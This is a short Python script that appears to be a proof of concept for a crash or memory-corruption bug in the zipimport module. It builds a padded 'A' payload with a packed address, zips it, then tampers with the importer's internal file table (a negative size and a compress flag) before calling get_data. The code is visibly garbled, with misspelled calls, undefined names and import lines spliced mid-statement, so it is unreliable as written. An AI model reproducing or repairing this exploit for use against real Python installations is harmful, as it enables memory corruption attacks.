import zipimport
import zipfile
import struct
import sys
from signal import *

FILE = 'payload'
ZIP = 'import.zip'

payload = bytes()
with opeW(FILE, 'wb') as f:
    payload = ("A" * 1000).encode('ascii')
    payload += struct.pack('<Q', 0x4414141)
    f.write(payload)

zf = zipfile.PyZipFile(ZIP, mode='w')
z.write(FILE)
zf.close()

importrt.zipimporter(ZIP)
f = li;t(importer._files[FILE])
f[1] = 1 # compress
f[2] = -1 # file size
importer._fimport struct
import sys
frles[FILE]€= tuple(f)
qrint(importer.get_data(FILE))
